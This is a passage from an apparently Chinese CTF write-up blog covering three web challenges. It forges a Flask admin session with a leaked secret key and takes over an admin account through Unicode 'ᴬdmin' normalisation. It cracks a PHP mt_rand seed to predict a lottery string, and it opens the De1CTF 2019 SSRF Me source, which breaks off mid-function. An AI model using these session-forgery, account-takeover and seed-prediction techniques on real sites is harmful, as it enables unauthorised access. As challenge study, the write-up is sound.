<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/%E5%85%B6%E5%AE%83/image-185.png" alt loading="lazy"></p>
<p>可知需要用户为admin才可以拿到flag，下载下来后发现web框架是用<a href="https://baike.baidu.com/item/Flask/1241509?fr=aladdin">flask</a>写的</p>
<p>解题具体操作如下：</p>
<p>先注册一个账户：admin1</p>
<p>在index界面拿到自己的session，进行解码，上大佬脚本</p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> sys
<span class="token keyword">import</span> zlib
<span class="token keyword">from</span> base64 <span class="token keyword">import</span> b64decode
<span class="token keyword">from</span> flask<span class="token punctuation">.</span>sessions <span class="token keyword">import</span> session_json_serializer
<span class="token keyword">from</span> itsdangerous <span class="token keyword">import</span> base64_decode

<span class="token keyword">def</span> <span class="token function">decryption</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">:</span>
    payload<span class="token punctuation">,</span> sig <span class="token operator">=</span> payload<span class="token punctuation">.</span>rsplit<span class="token punctuation">(</span><span class="token string">b'.'</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span>
    payload<span class="token punctuation">,</span> timestamp <span class="token operator">=</span> payload<span class="token punctuation">.</span>rsplit<span class="token punctuation">(</span><span class="token string">b'.'</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span>

    decompress <span class="token operator">=</span> <span class="token boolean">False</span>
    <span class="token keyword">if</span> payload<span class="token punctuation">.</span>startswith<span class="token punctuation">(</span><span class="token string">b'.'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        payload <span class="token operator">=</span> payload<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">]</span>
        decompress <span class="token operator">=</span> <span class="token boolean">True</span>

    <span class="token keyword">try</span><span class="token punctuation">:</span>
        payload <span class="token operator">=</span> base64_decode<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
    <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>
        <span class="token keyword">raise</span> Exception<span class="token punctuation">(</span><span class="token string">'Could not base64 decode the payload because of '</span>
                         <span class="token string">'an exception'</span><span class="token punctuation">)</span>

    <span class="token keyword">if</span> decompress<span class="token punctuation">:</span>
        <span class="token keyword">try</span><span class="token punctuation">:</span>
            payload <span class="token operator">=</span> zlib<span class="token punctuation">.</span>decompress<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
        <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>
            <span class="token keyword">raise</span> Exception<span class="token punctuation">(</span><span class="token string">'Could not zlib decompress the payload before '</span>
                             <span class="token string">'decoding the payload'</span><span class="token punctuation">)</span>

    <span class="token keyword">return</span> session_json_serializer<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>

<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>decryption<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre>

<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/%E5%85%B6%E5%AE%83/image-187.png" alt loading="lazy"></p>
<p>在index.html发现只要session[‘name’]==’admin’即可作为admin用户登录，再将解码出来的session中的name改为admin再进行一次编码来伪造admin的session，对session编码需要SECRET_KEY，在config.py处找到，此处用脚本编码，<a href="https://github.com/noraj/flask-session-cookie-manager">脚本git下载地址</a></p>
<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/%E5%85%B6%E5%AE%83/image-188.png" alt loading="lazy"></p>
<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/%E5%85%B6%E5%AE%83/image-186.png" alt loading="lazy"></p>
<p>将自己的session修改为编码后的session即可得到flag</p>
<h3 id="Unicode欺骗"><a href="#Unicode欺骗" class="headerlink" title="Unicode欺骗"></a>Unicode欺骗</h3><p>当解题思路断了的时候，不妨结合代码角度思考，前面在改密码界面就感觉到不对，因为密码就直接改不需要验证什么的，于是找到改密码的change函数</p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/change'</span><span class="token punctuation">,</span> methods <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">,</span> <span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">change</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span> <span class="token keyword">not</span> current_user<span class="token punctuation">.</span>is_authenticated<span class="token punctuation">:</span>
        <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'login'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    form <span class="token operator">=</span> NewpasswordForm<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> request<span class="token punctuation">.</span>method <span class="token operator">==</span> <span class="token string">'POST'</span><span class="token punctuation">:</span>
        name <span class="token operator">=</span> strlower<span class="token punctuation">(</span>session<span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
        user <span class="token operator">=</span> User<span class="token punctuation">.</span>query<span class="token punctuation">.</span>filter_by<span class="token punctuation">(</span>username<span class="token operator">=</span>name<span class="token punctuation">)</span><span class="token punctuation">.</span>first<span class="token punctuation">(</span><span class="token punctuation">)</span>
        user<span class="token punctuation">.</span>set_password<span class="token punctuation">(</span>form<span class="token punctuation">.</span>newpassword<span class="token punctuation">.</span>data<span class="token punctuation">)</span>
        db<span class="token punctuation">.</span>session<span class="token punctuation">.</span>commit<span class="token punctuation">(</span><span class="token punctuation">)</span>
        flash<span class="token punctuation">(</span><span class="token string">'change successful'</span><span class="token punctuation">)</span>
        <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'index'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'change.html'</span><span class="token punctuation">,</span> title <span class="token operator">=</span> <span class="token string">'change'</span><span class="token punctuation">,</span> form <span class="token operator">=</span> form<span class="token punctuation">)</span></code></pre>

<p>经大佬文章提点，发现在进行改密的时候使用了strlower函数将用户名转成了小写，一般在python中转小写用的都是lower函数，于是跟进strlower函数</p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">strlower</span><span class="token punctuation">(</span>username<span class="token punctuation">)</span><span class="token punctuation">:</span>
    username <span class="token operator">=</span> nodeprep<span class="token punctuation">.</span>prepare<span class="token punctuation">(</span>username<span class="token punctuation">)</span>
    <span class="token keyword">return</span> username</code></pre>

<p>研究nodeprep.prepare函数，nodeprep是从Twisted模块导入的，在requirements.txt文件中看到Twisted版本与最新版本相差甚远，存在猫腻，<a href="https://panda1g1.github.io/2018/11/15/HCTF%20admin/">参考</a></p>
<p>于是就有了以下的Unicode编码问题；具体编码方式：<a href="https://unicode-table.com/cn/search/?q=%E4%BF%AE%E9%A5%B0%E5%AD%97%E6%AF%8D%E5%A4%A7%E5%86%99">修饰字母大写</a></p>
<p>nodeprep.prepare会进行如下操作</p>
<p>ᴬ-&gt;A-&gt;a;ᴬdmin-&gt;Admin-&gt;admin</p>
<p>参考：</p>
<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/%E5%85%B6%E5%AE%83/ba81f7598149fdce96a3ad74e3ab6ff1.png" alt loading="lazy"></p>
<p>注册 ᴬdmin ；登录 ᴬdmin ，经过一次strlower变成Admin，修改密码时name又经过一次strlower更改了admin的密码，随后即可以修改后的密码登录拿到flag</p>
<h2 id="安恒杯-新春祈福赛—枯燥的抽奖"><a href="#安恒杯-新春祈福赛—枯燥的抽奖" class="headerlink" title="安恒杯-新春祈福赛—枯燥的抽奖"></a>安恒杯-新春祈福赛—枯燥的抽奖</h2><p>界面：</p>
<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/%E5%85%B6%E5%AE%83/image-20200202200452558.png" alt loading="lazy"></p>
<p>F12发现check.php，访问得到php源码</p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token comment">#这不是抽奖程序的源代码！不许看！</span>
<span class="token function">header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Content-Type: text/html;charset=utf-8"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'seed'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
<span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'seed'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token function">rand</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">999999999</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token function">mt_srand</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'seed'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$str_long1</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ"</span><span class="token punctuation">;</span>
<span class="token variable">$str</span><span class="token operator">=</span><span class="token string single-quoted-string">''</span><span class="token punctuation">;</span>
<span class="token variable">$len1</span><span class="token operator">=</span><span class="token number">20</span><span class="token punctuation">;</span>
<span class="token keyword">for</span> <span class="token punctuation">(</span> <span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token variable">$len1</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span> <span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token variable">$str</span><span class="token operator">.=</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$str_long1</span><span class="token punctuation">,</span> <span class="token function">mt_rand</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$str_long1</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>       
<span class="token punctuation">&#125;</span>
<span class="token variable">$str_show</span> <span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;p id='p1'>"</span><span class="token operator">.</span><span class="token variable">$str_show</span><span class="token operator">.</span><span class="token string double-quoted-string">"&lt;/p>"</span><span class="token punctuation">;</span>


<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'num'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'num'</span><span class="token punctuation">]</span><span class="token operator">===</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>x
        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;p id=flag>抽奖，就是那么枯燥且无味，给你flag&#123;xxxxxxxxx&#125;&lt;/p>"</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">else</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;p id=flag>没抽中哦，再试试吧&lt;/p>"</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
<span class="token function">show_source</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"check.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span></code></pre>

<p>发现mt_srand()和mt_rand() 并且session是用随机数设置的</p>
<p>上爆破工具php_mt_seed和脚本得到随机数种子</p>
<pre class="language-python" data-language="python"><code class="language-python">str1<span class="token operator">=</span><span class="token string">'abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ'</span>
str2<span class="token operator">=</span><span class="token string">'cTVM5ZeUkl'</span>
length <span class="token operator">=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>str2<span class="token punctuation">)</span>
res<span class="token operator">=</span><span class="token string">''</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>str2<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>str1<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">if</span> str2<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> str1<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">:</span>
            res<span class="token operator">+=</span><span class="token builtin">str</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">' '</span><span class="token operator">+</span><span class="token builtin">str</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">' '</span><span class="token operator">+</span><span class="token string">'0'</span><span class="token operator">+</span><span class="token string">' '</span><span class="token operator">+</span><span class="token builtin">str</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>str1<span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">' '</span>
            <span class="token keyword">break</span>
<span class="token keyword">print</span> res</code></pre>

<p>得到</p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token number">2</span> <span class="token number">2</span> <span class="token number">0</span> <span class="token number">61</span> <span class="token number">55</span> <span class="token number">55</span> <span class="token number">0</span> <span class="token number">61</span> <span class="token number">57</span> <span class="token number">57</span> <span class="token number">0</span> <span class="token number">61</span> <span class="token number">48</span> <span class="token number">48</span> <span class="token number">0</span> <span class="token number">61</span> <span class="token number">31</span> <span class="token number">31</span> <span class="token number">0</span> <span class="token number">61</span> <span class="token number">61</span> <span class="token number">61</span> <span class="token number">0</span> <span class="token number">61</span> <span class="token number">4</span> <span class="token number">4</span> <span class="token number">0</span> <span class="token number">61</span> <span class="token number">56</span> <span class="token number">56</span> <span class="token number">0</span> <span class="token number">61</span> <span class="token number">10</span> <span class="token number">10</span> <span class="token number">0</span> <span class="token number">61</span> <span class="token number">11</span> <span class="token number">11</span> <span class="token number">0</span> <span class="token number">61</span></code></pre>

<p>爆破</p>
<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/%E5%85%B6%E5%AE%83/image-20200202201906349.png" alt loading="lazy"></p>
<p>将得到的随机种子放到php脚本中</p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token function">mt_srand</span><span class="token punctuation">(</span><span class="token number">654818272</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$str_long1</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ"</span><span class="token punctuation">;</span>
<span class="token variable">$str</span><span class="token operator">=</span><span class="token string single-quoted-string">''</span><span class="token punctuation">;</span>
<span class="token variable">$len1</span><span class="token operator">=</span><span class="token number">20</span><span class="token punctuation">;</span>
<span class="token keyword">for</span> <span class="token punctuation">(</span> <span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token variable">$len1</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span> <span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token variable">$str</span><span class="token operator">.=</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$str_long1</span><span class="token punctuation">,</span> <span class="token function">mt_rand</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$str_long1</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
<span class="token punctuation">&#125;</span>
<span class="token keyword">echo</span> <span class="token variable">$str</span><span class="token punctuation">;</span>
<span class="token delimiter important">?></span></span></code></pre>

<p>得到字符串</p>
<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/%E5%85%B6%E5%AE%83/image-20200202202206918.png" alt loading="lazy"></p>
<h2 id="De1CTF-2019—SSRF-Me"><a href="#De1CTF-2019—SSRF-Me" class="headerlink" title="De1CTF-2019—SSRF Me"></a>De1CTF-2019—SSRF Me</h2><p>点开链接得到源码</p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token comment">#! /usr/bin/env python</span>
<span class="token comment">#encoding=utf-8</span>
<span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask
<span class="token keyword">from</span> flask <span class="token keyword">import</span> request
<span class="token keyword">import</span> socket
<span class="token keyword">import</span> hashlib
<span class="token keyword">import</span> urllib
<span class="token keyword">import</span> sys
<span class="token keyword">import</span> os
<span class="token keyword">import</span> json
<span class="token builtin">reload</span><span class="token punctuation">(</span>sys<span class="token punctuation">)</span>
sys<span class="token punctuation">.</span>setdefaultencoding<span class="token punctuation">(</span><span class="token string">'latin1'</span><span class="token punctuation">)</span>

app <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>

secert_key <span class="token operator">=</span> os<span class="token punctuation">.</span>urandom<span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span>

<span class="token keyword">class</span> <span class="token class-name">Task</span><span class="token punctuation">:</span>
    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> action<span class="token punctuation">,</span> param<span class="token punctuation">,</span> sign<span class="token punctuation">,</span> ip<span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token comment">#python的构造方法</span>
        self<span class="token punctuation">.</span>action <span class="token operator">=</span> action
        self<span class="token punctuation">.</span>param <span class="token operator">=</span> param
        self<span class="token punctuation">.</span>sign <span class="token operator">=</span> sign
        self<span class="token punctuation">.</span>sandbox <span class="token operator">=</span> md5<span class="token punctuation">(</span>ip<span class="token punctuation">)</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">not</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>exists<span class="token punctuation">(</span>self<span class="token punctuation">.</span>sandbox<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>          <span class="token comment">#SandBox For Remote_Addr</span>
            os<span class="token punctuation">.</span>mkdir<span class="token punctuation">(</span>self<span class="token punctuation">.</span>sandbox<span class="token punctuation">)</span>

    <span class="token keyword">def</span> <span class="token function">Exec</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>                       <span class="token comment">#定义的命令执行函数，此处调用了scan这个自定义的函数</span>
        result <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>
        result<span class="token punctuation">[</span><span class="token string">'code'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">500</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>self<span class="token punctuation">.</span>checkSign<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
            <span class="token keyword">if</span> <span class="token string">"scan"</span> <span class="token keyword">in</span> self<span class="token punctuation">.</span>action<span class="token punctuation">:</span><span class="token comment">#action要写scan</span>
                tmpfile <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"./%s/result.txt"</span> <span class="token operator">%</span> self<span class="token punctuation">.</span>sandbox<span class="token punctuation">,</span> <span class="token string">'w'</span><span class="token punctuation">)</span>
                resp <span class="token operator">=</span> scan<span class="token punctuation">(</span>self<span class="token punctuation">.</span>param<span class="token punctuation">)</span>   <span class="token comment">#文件读取</span>
                <span class="token keyword">if</span> <span class="token punctuation">(</span>resp <span class="token operator">==</span> <span class="token string">"Connection Timeout"</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
                    result<span class="token punctuation">[</span><span class="token string">'data'</span><span class="token punctuation">]</span> <span class="token operator">=</span> resp
                <span class="token keyword">else</span><span class="token punctuation">:</span>
                    <span class="token keyword">print</span> resp            <span class="token comment">#输出结果</span>
                    tmpfile<span class="token punctuation">.</span>write<span class="token punctuation">(</span>resp<span class="token punctuation">)</span>
                    tmpfile<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>
                result<span class="token punctuation">[</span><span class="token string">'code'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">200</span>
            <span class="token keyword">if</span> <span class="token string">"read"</span> <span class="token keyword">in</span> self<span class="token punctuation">.</span>action<span class="token punctuation">:</span><span class="token comment">#action要加read</span>
                f <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"./%s/result.txt"</span> <span class="token operator">%</span> self<span class="token punctuation">.</span>sandbox<span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">)</span>
                result<span class="token punctuation">[</span><span class="token string">'code'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">200</span>
                result<span class="token punctuation">[</span><span class="token string">'data'</span><span class="token punctuation">]</span> <span class="token operator">=</span> f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>
            <span class="token keyword">if</span> result<span class="token punctuation">[</span><span class="token string">'code'</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">500</span><span class="token punctuation">:</span>
                result<span class="token punctuation">[</span><span class="token string">'data'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"Action Error"</span>
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            result<span class="token punctuation">[</span><span class="token string">'code'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">500</span>
            result<span class="token punctuation">[</span><span class="token string">'msg'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"Sign Error"</span>
        <span class="token keyword">return</span> result

    <span class="token keyword">def</span> <span class="token function">checkSign</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>getSign<span class="token punctuation">(</span>self<span class="token punctuation">.</span>action<span class="token punctuation">,</span> self<span class="token punctuation">.</span>param<span class="token punctuation">)</span> <span class="token operator">==</span> self<span class="token punctuation">.</span>sign<span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token comment">#!!!校验</span>
            <span class="token keyword">return</span> <span class="token boolean">True</span>
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            <span class="token keyword">return</span> <span class="token boolean">False</span>

<span class="token comment">#generate Sign For Action Scan.</span>
<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">"/geneSign"</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">,</span> <span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token comment">#用于测试</span>
<span class="token keyword">def</span> <span class="token function">geneSign</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    param <span class="token operator">=</span> urllib<span class="token punctuation">.</span>unquote<span class="token punctuation">(</span>request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"param"</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">)</span> 
    action <span class="token operator">=</span> <span class="token string">"scan"</span>
    <span class="token keyword">return</span> getSign<span class="token punctuation">(</span>action<span class="token punctuation">,</span> param<span class="token punctuation">)</span>

<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/De1ta'</span><span class="token punctuation">,</span>methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">,</span><span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token comment">#实际注入</span>
<span class="token keyword">def</span> <span class="token function">challenge</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    action <span class="token operator">=</span> urllib<span class="token punctuation">.</span>unquote<span class="token punctuation">(</span>request<span class="token punctuation">.</span>cookies<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"action"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    param <span class="token operator">=</span> urllib<span class="token punctuation">.</span>unquote<span class="token punctuation">(</span>request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"param"</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    sign <span class="token operator">=</span> urllib<span class="token punctuation">.</span>unquote<span class="token punctuation">(</span>request<span class="token punctuation">.</span>cookies<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"sign"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    ip <span class="token operator">=</span> request<span class="token punctuation">.</span>remote_addr   <span class="token comment">#获取用户ip</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span>waf<span class="token punctuation">(</span>param<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> <span class="token string">"No Hacker!!!!"</span>
    task <span class="token operator">=</span> Task<span class="token punctuation">(</span>action<span class="token punctuation">,</span> param<span class="token punctuation">,</span> sign<span class="token punctuation">,</span> ip<span class="token punctuation">)</span>
    <span class="token keyword">return</span> json<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>task<span class="token punctuation">.</span>Exec<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span><span class="token comment">#根目录路由</span>
<span class="token keyword">def</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">return</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"code.txt"</span><span class="token punctuation">,</span><span class="token string">"r"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">scan</span><span class="token punctuation">(</span>param<span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token comment">#这是用来扫目录的函数</span>
    socket<span class="token punctuation">.</span>setdefaulttimeout<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
    <span class="token keyword">try</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> urllib<span class="token punctuation">.</span>urlopen<span class="token punctuation">(</span>param<span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">50</span><span class="token punctuation">]</span>
    <span class="token keyword">except</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> <span class="token string">"Connection Timeout"</span>

<span class="token keyword">def</span> <span class="token function">getSign</span><span class="token punctuation">(</span>action<span class="token punctuation">,</span> param<span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token comment">#MD5计算,此处注意顺序先是param后是action</span>
    <span class="token keyword">return</span> hashlib<span class="token punctuation">.</span>md5<span class="token punctuation">(</span>secert_key <span class="token operator">+</span> param <span class="token operator">+</span> action<span class="token punctuation">)</span><span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">md5</span><span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token punctuation">:</span>
